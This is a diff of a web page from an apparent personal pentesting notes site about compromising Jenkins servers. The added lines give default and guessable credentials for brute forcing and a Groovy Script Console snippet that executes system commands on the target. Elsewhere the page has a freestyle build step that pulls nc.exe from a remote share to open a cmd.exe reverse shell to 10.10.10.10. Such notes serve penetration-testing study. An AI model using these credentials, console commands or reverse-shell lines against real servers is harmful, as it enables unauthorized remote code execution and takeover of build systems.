@@ -306,9 +306,18 @@ Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1
 
 <p>There are no default credentials but some times these works.</p>
 
+<blockquote>
+  <p><strong>Note</strong>: Jenkins does <strong>not have</strong> any type of <strong>account lockout</strong> neither a <strong>strong password policy</strong> so you can try to brute force it.</p>
+</blockquote>
+
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
+admin:nimda
 admin:password
 admin:jenkins
+manager:manager
+manager:reganam
+manager:password
+manager:jenkins
 </code></pre></div></div>
 
 <p>In new versions the password is randomized at installation. We can find the initial password here:</p>
@@ -339,7 +348,18 @@ C:\Program Files\Jenkins\secrets\initialAdminPassword
 
 <p>To obtain a Reverse shell we need to execute <strong><code class="highlighter-rouge">Manage Jenkins</code></strong> on <strong><code class="highlighter-rouge">Script Console.</code></strong></p>
 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;jenkins_server&gt;/script
+</code></pre></div></div>
+
 <p><img src="/hackingnotes/images/jenkins_scriptconsole.png" alt="Jenking Script Console." /></p>
+
+<p>This is and example of Grovy Script to execute commands on the target machine, either windows or linux.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'whoami'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out&gt; $sout err&gt; $serr"
+</code></pre></div></div>
 
 <h3 id="windows-reverse-shell">Windows Reverse Shell</h3>
 
@@ -368,7 +388,9 @@ println "out&gt; $sout err&gt; $serr"
 
 <h2 id="freestyle-project">Freestyle Project</h2>
 
-<p>Go on <strong><code class="highlighter-rouge">New Item</code></strong> tab.</p>
+<p>We can create a new project or see if we can modify the configuration of an existant project.</p>
+
+<p>To create a new project go on <strong><code class="highlighter-rouge">New Item</code></strong> tab.</p>
 
 <p><img src="/hackingnotes/images/jenkins_newitem.png" alt="Jenkins Dashboard" /></p>
 
@@ -383,6 +405,7 @@ println "out&gt; $sout err&gt; $serr"
 <p>Introduce the reverse shell on the Command window and click <strong><code class="highlighter-rouge">Save</code></strong>.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10
+powershell.exe -c &lt;command&gt;
 </code></pre></div></div>
 
 <p>Go to <strong><code class="highlighter-rouge">Build Now</code></strong> section.</p>
@@ -391,7 +414,7 @@ println "out&gt; $sout err&gt; $serr"
 
 <p>When the build is executed a new item will be displayed under the <strong><code class="highlighter-rouge">Build History</code></strong>.</p>
 
-<p><img src="/hackingnotes/images/jenkins_history" alt="Jenkins Build History." /></p>
+<p><img src="/hackingnotes/images/jenkins_history.png" alt="Jenkins Build History." /></p>
 
 <p>At that moment a reverse shell is obtained.</p>
 
